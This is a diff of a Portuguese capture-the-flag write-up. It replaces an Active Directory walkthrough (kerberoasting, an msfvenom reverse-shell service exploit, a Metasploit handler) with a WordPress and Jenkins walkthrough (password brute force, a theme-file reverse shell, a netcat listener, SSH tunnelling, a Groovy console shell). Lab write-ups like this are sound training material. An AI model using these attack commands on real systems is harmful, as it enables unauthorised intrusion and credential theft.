@@ -70,6 +70,9 @@ As quebras do site foram solucionadas após a inserção do domínio no arquivo 
 
 <img width="1072" height="481" alt="image" src="https://github.com/user-attachments/assets/5227aae5-c528-4a08-bfb8-e1da32090ab7" />
 
+---
+## 2. Intrusão Inicial (Initial Access)
+
 Foi encontrado um número de versão do wordpress. Sabendo disso, será utilizado uma ferramenta para a enumeração de pontos de entrada e vulnerabilidades no wordpress, o wpscan, buscando por plugins e contas de usuários vulneráveis:
 
 ```bash
@@ -87,70 +90,74 @@ wpscan --url http://internal.thm/blog/ --usernames admin --passwords /usr/share/
 
 <img width="889" height="236" alt="image" src="https://github.com/user-attachments/assets/33765503-74e8-4dbd-922c-51201ab3243c" />
 
-Foi encontrado credenciais válidas de acesso administrativo para acesso ao WordPress do servidor. Com as credenciais em mãos, foi feito login no painel administrativo.
+Foi encontrado uma credencial válida de acesso administrativo para acesso ao WordPress do servidor. Com as credenciais em mãos, foi feito login no painel administrativo.
 
 <img width="1357" height="581" alt="image" src="https://github.com/user-attachments/assets/7a82163b-fe6b-4fa6-a659-5269c0df1b55" />
 
 Com esse acesso, analisa-se os plugins e temas em busca de algum que permita escrita, dessa forma, pode-se realizar um Reverse Shell para a máquina do atacante.
 
-
----
-## 2. Intrusão Inicial (Initial Access)
-
-
-Após não encontrar nada relevante para a intrusão nos diretórios encontrados no SMB, vamos realizar uma nova varredura em busca de mais portas abertas, e dessa vez, realizamos para todas as portas, afim de encontrar uma porta da qual não encontramos antes.
-
-<img width="834" height="468" alt="image" src="https://github.com/user-attachments/assets/181da457-7496-4e07-ad27-a2a332a4f659" />
-
-Essa nova varredura descobriu diversas novas portas mas que possivelmente estão sendo filtradas, mas, uma delas dispõe de um serviço IIS, dessa forma, foi analisado na web essa porta.
-
-<img width="1365" height="588" alt="image" src="https://github.com/user-attachments/assets/4513e690-a40d-44f2-a4b3-6a8b75691151" />
-
-Ao acessar a interface encontramos uma página que espera uma conexão com e-mail, que também dispõe de conexões com Google e Microsoft. Mas antes mesmo de tentar acessar com uma conta teste, há um aviso na tela informando a migração para o GitHub, algo estranho.
-Com isso em mente, foi pesquisado usando Google Dorks relação com o GitHub e o enterprise.thm. Logo no primeiro resultado foi encontrado um repositório relacionado à máquina do laboratório.
-
-<img width="1364" height="582" alt="image" src="https://github.com/user-attachments/assets/aeb487e5-7516-4dc8-8baf-e97269383a7b" />
-
-Explorando o GitHub, foi possível encontrar 1 pessoa ligada ao repositório do Enterprise. analisando essa pessoa, encontramos um arquivo .ps1. Ao verificar esse arquivo não foi encontrado nada, mas ao verificar o histórico de commits, foi descoberto credenciais de AD.
-
-<img width="1360" height="583" alt="image" src="https://github.com/user-attachments/assets/17b5b9d5-3327-4e71-85a9-012ee29a3da8" />
-
 ### Exploração da Vulnerabilidade
-* **Vulnerabilidade:** Information Disclosure(Credenciais de domínio expostas em repositórios públicos)
-* **Vetor de Ataque:** Uso das credenciais para busca de novas credenciais no AD, enumeração de usuários e acesso não autorizado via RDP.
+* **Vulnerabilidade:** Remote Code Execution via Edição Arbitrária de arquivos de Temas
+* **Vetor de Ataque:** Acesso administrativo e permissão de edição de arquivos de tema do wordpress levando a um RCE.
 
-Agora por termos credenciais válidas de um usuário, podemos usá-la para encontrar outros usuários e senhas usando a técnica de kerberoasting identificando contas de serviço vinculadas a Service Principal Names(SPNs), afim de conseguir mais usuários.
+Após a entrada no painel administrativo do WordPress, foi encontrado um tema que permitia sobrescrever o arquivo php do mesmo. 
 
-```bash
-/usr/share/doc/python3-impacket/examples/GetUserSPNs.py lab.enterprise.thm/n[ENCONTRADO]:T[ENCONTRADO] -request
-```
+<img width="1356" height="578" alt="image" src="https://github.com/user-attachments/assets/8d65f85e-bec5-42b2-8254-1d764f5521c8" />
 
-<img width="834" height="268" alt="image" src="https://github.com/user-attachments/assets/f0f58d92-1071-4b43-bc10-5f45b94b66de" />
+Assim, é utilizado essa vulnerabilidade para usar um shell reverso no lugar do corpo original do texto e salvar o arquivo .php com a nova informação(O Reverse Shell utilizado, foi pego no site revshells.com).
 
-Após conseguir a hash SPN, deve ser utilizado o john para a tentativa de quebra conseguindo uma nova credencial nesse domínio.
+<img width="1314" height="549" alt="image" src="https://github.com/user-attachments/assets/0d266c9b-e9ee-478d-b9de-e4de70e16771" />
 
-```bash
-john --format=krb5tgs spn --wordlist=/usr/share/wordlists/rockyou.txt
-```
-
-<img width="796" height="180" alt="image" src="https://github.com/user-attachments/assets/58955f1b-b876-4565-bfe3-e819db62675f" />
-
-Com essas duas credenciais, é possível tentar abusar da porta RDP aberta no domínio. Primeiro com o usuário n[ENCONTRADO] falha, mas com o usuário b[ENCONTRADO] o acesso é realizado.
+Agora com o payload já pronto para ser executado, é preciso abrir uma mesma porta inserida nele na máquina do atacante.
 
 ```bash
-xfreerdp /v:lab.enterprise.thm /u:'n[ENCONTRADO]' /p:'T[ENCONTRADO]' /dynamic-resolution /clipboard /cert:ignore
-#Retornou erro, não funcionando com o usuário do GitHub
-xfreerdp /v:lab.enterprise.thm /u:'b[ENCONTRADO]' /p:'l[ENCONTRADO]' /dynamic-resolution /clipboard /cert:ignore
-#Acesso RDP com sucesso utilizando o usuário encontrado com o SPN.
+nc -vlp 1234
 ```
 
-<img width="1006" height="593" alt="image" src="https://github.com/user-attachments/assets/b0c34223-45de-43ca-85c3-2108fa4080b0" />
+<img width="381" height="137" alt="image" src="https://github.com/user-attachments/assets/9ae80701-b975-4ac7-b812-0b55932ff4f2" />
 
-Assim, o arquivo user possui a primeira flag: THM{e[ENCONTRADO]}
+Com a porta já aberta aguardando a conexão na máquina do atacante, para que a shell interativa seja executada, é necessário acessar o arquivo "archive.php" do tema, diretamente pelo navegador, que fará o payload ser executado e estabelecer conexão com a máquina do atacante. O caminho padrão do tema vulnerável é "/wp-content/themes/twentyseventeen/"
+
+<img width="1241" height="446" alt="image" src="https://github.com/user-attachments/assets/0c50d900-47a9-411e-ba30-cf02cc903421" />
+
+Acesso concedido ao servidor com usuário www-data!!
+
+### Exploração do Servidor manualmente
+
+Após o acesso, em primeiro lugar foi realizado uma tentativa de adentrar ao usuário que existia na máquina, mas o acesso não tinha permissão, com isso em vista, realizamos o processo de melhoria da shell que foi obtida.
+
+```bash
+python3 -c ‘import pty; pty.spawn(”/bin/bash”)’
+#Após o Enter, fazer o comando CTRL+Z
+stty raw -echo; fg #Aqui precisa apertar Enter duas vezes
+stty rows 16 columns 136
+export TERM=xterm-256color
+```
+
+<img width="526" height="252" alt="image" src="https://github.com/user-attachments/assets/c29521b1-96a6-4aa0-9ca9-8a0b0f63b05e" />
+
+Agora com uma shell completa, será necessário procurar novos pontos de entrada ou credenciais que permita o acesso ao usuário "aubreanna".
+
+**Diretórios Interessantes para Exploração:**
+* **/tmp:**
+* **/opt:** 
+* **/var/www/html/:**
+
+Ao analisar o conteúdo das pastas, uma chamou mais atenção, essa pasta tinha um arquivo "containerd" e um "wp-save.txt". Ao verificar esse arquivo, conseguimos as credenciais do usuário aubreanna.
+
+<img width="885" height="421" alt="image" src="https://github.com/user-attachments/assets/ef10300a-ec25-45ae-9ec8-91fe27d48180" />
+
+Ao testar as credenciais na porta SSH do servidor, foi constatado que era possível o acesso. Dessa forma, conseguimos a primeira flag que era buscado "THM{[ENCONTRADO]}"
+
+```bash
+ssh aubreanna@internal.thm
+```
+
+<img width="713" height="527" alt="image" src="https://github.com/user-attachments/assets/669764dd-3dfd-41e1-8b0e-b5400e24dee2" />
 
 ---
 
-> **Acesso obtido:** RDP estabelecido com o usuário e senha encontrado quebrando a hash SPN.
+> **Acesso obtido:** Acesso inicial realizado via Brute Force no usuário admin do Wordpress, após RCE via edição de temas do mesmo, levando ao SSH por Information Disclosure dentro do servidor.
 
 ---
 
@@ -159,44 +166,54 @@ Assim, o arquivo user possui a primeira flag: THM{e[ENCONTRADO]}
 ### Enumeração Interna
 Identificação do vetor de elevação de privilégios:
 
-Para identificar vetores para elevação de privilégios, foi tranferido o arquivo WinPEAS.ps1 para a máquina e verificado os resultados encontrados. Foi identificado um serviço com o nome de ZeroTier One.exe, o mesmo disponibilizava de uma vulnerabilidade Unquoted Service Path(caminho de serviço sem aspas) combinada com permissão de escrita no diretório pai.
+No mesmo usuário, há um arquivo "jenkins.txt" que informa existir um serviço Jenkins Interno rodando em "172.17.0.2:8080". Mas, analisando a máquina que foi acessada, ela possui o IP 172.16.0.1 atribuída.
 
-<img width="1365" height="627" alt="image" src="https://github.com/user-attachments/assets/c1c4ad61-57f4-4408-bc34-e3aa874175a8" />
+<img width="885" height="448" alt="image" src="https://github.com/user-attachments/assets/fdb2b0db-3492-4a42-aede-1acfa8e6130b" />
 
-Como o mesmo está com a flag de Unquoted, significa que é possível criar um arquivo malicioso e inseri-lo antes da pasta que possui o executável original da aplicação(Tem permissão de escrita). Para isso utiliza-se o msfvenom para criar um arquivo .exe com reverse shell:
-
-```bash
-msfvenom -p windows/x64/shell/reverse_tcp -f exe LHOST=[MEU_IP] LPORT=1234 -o shell.exe
-```
-
-<img width="839" height="308" alt="image" src="https://github.com/user-attachments/assets/34a0965d-4b83-4998-a148-a7ab89ad179d" />
-
-Após a criação, realizamos a transferência para a máquina alvo(foi realizado copia e cola, pois no xfreerdp havia inserido a flag "/clipboard"), renomeamos para "Zero.exe" e colocamos na pasta encontrada no WinPEAS.
-
-<img width="837" height="287" alt="image" src="https://github.com/user-attachments/assets/a55c9159-31be-4cee-b2ec-d3e6262acd9a" />
-
-Após a cópia, como se trata de um serviço, é necessário apenas executar o início desse serviço. Mas antes, devemos executar o handler do Metasploit na máquina atacante, tendo em vista o payload malicioso ter sido feito com msfvenom.
+Dessa forma, para conseguir interagir com o serviço interno, será necessário realizar um tunelamento SSH na máquina, usando as credenciais do usuário "aubreanna".
 
 ```bash
-msf > use exploit/multi/handler #Usar handler para capturar a shell
-msf exploit(multi/handler) > set LHOST [IP_ATACANTE]
-msf exploit(multi/handler) > SET LPORT 1234
-msf exploit(multi/handler) > rerun
+ssh -L 1234:172.17.0.2:8080 aubreanna@internal.thm
 ```
 
-<img width="844" height="483" alt="image" src="https://github.com/user-attachments/assets/a74a75a6-f0de-40ad-b8a6-8b2493e12784" />
+Após realizar o tunelamento, será possível acessar o serviço pela máquina do atacante na porta escolhida no ip local da máquina.
 
-Agora com o handler aguardando a conexão, basta executar o serviço "zerotieroneservice" na máquina alvo.
+<img width="931" height="607" alt="image" src="https://github.com/user-attachments/assets/1c4763a1-44a6-4d9f-b5fa-1d1454994968" />
 
-<img width="1345" height="554" alt="image" src="https://github.com/user-attachments/assets/4fe8446b-d427-4704-8b8f-afe505e4570a" />
+Agora com acesso ao serviço, será necessário descobrir credenciais para acesso ao mesmo. Por se tratar de um serviço interno, será realizado um ataque de Brute Force com FFUF. Para isso, utiliza-se o navegador do Burp para capturar a requisição de login incorreta.
 
-Com acesso pleno de NT Authority\System, é possível acessar a pasta de rede do usuário administrador e pegar a última flag para a sala.
+<img width="1287" height="615" alt="image" src="https://github.com/user-attachments/assets/f7ed3c51-1d13-4529-a374-6dcee2e6786b" />
 
-<img width="844" height="347" alt="image" src="https://github.com/user-attachments/assets/90c04fdd-9989-4c00-a37c-ea33ec7ceca6" />
+Com isso, é necessário realizar a configuração no ffuf, para que o mesmo teste as senhas até que a resposta seja diferente de "302-401".
+
+```bash
+ffuf -X POST -u http://127.0.0.1:1234/j_acegi_security_check -d "j_username=admin&j_password=FUZZ&from=%2F&Submit=Sign+in" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/rockyou.txt -r -fc 401
+# -r faz com que o quando o ffuf encontre um 302, ele continue.
+```
+
+<img width="827" height="439" alt="image" src="https://github.com/user-attachments/assets/396c7d8a-fdf1-4ad9-97a9-14dcdb24fbc1" />
+
+Assim foi possível acessar o painel de controle do Jenkins. Ao entrar e verificar as configurações de gerenciamento do Jenkins, é possível ver uma opção de "console de script", assim, podendo ser utilizado para executar uma shell reversa, dando acesso não autorizado ao host que executa o serviço.
+
+<img width="1076" height="588" alt="image" src="https://github.com/user-attachments/assets/4d14a043-b8d0-4155-b98d-5411a0a39007" />
+
+Com isso, ao acessar o site do revshells.com, foi possível encontrar um script em Groovy, que será utilizado para a tentativa de shell reverso com o jenkins.
+
+<img width="1108" height="651" alt="image" src="https://github.com/user-attachments/assets/553c5148-9223-497b-819c-d3a53ad4eb03" />
+
+Ao executar o script com o Jenkins, foi possível acessar a máquina que hospeda o Jenkins, e dessa forma, foi realizado a tentativa de chegar ao diretório root. Não foi possível, então será necessário realizar a mesma enumeração de diretórios comuns anteriormente feito no usuário aubreanna.
+
+<img width="1038" height="625" alt="image" src="https://github.com/user-attachments/assets/053c9423-6921-4371-be99-3aa8c7593168" />
+
+Ao realizar a enumeração, foi possível verificar um arquivo com o nome de "note.txt" dentro da pasta "/opt". Dentro desse arquivo havia as credenciais de root da máquina. Com essa credencial, foi feito a tentativa de conexão com o usuário root no SSH.
+
+<img width="412" height="131" alt="image" src="https://github.com/user-attachments/assets/2cf76839-7c81-4ec9-805c-fdbbdb8deb74" />
+
+Escalação de privilégios bem sucedida, foi possível acessar o SSH da máquina com o usuário root!
 
 ---
 
-> **Acesso obtido:** Acesso Shell Interativa completa de administrador do sistema (NT AUTHORITY\SYSTEM).
+> **Acesso obtido:** Acesso Shell via SSH com o usuário root.
 
 ---
 
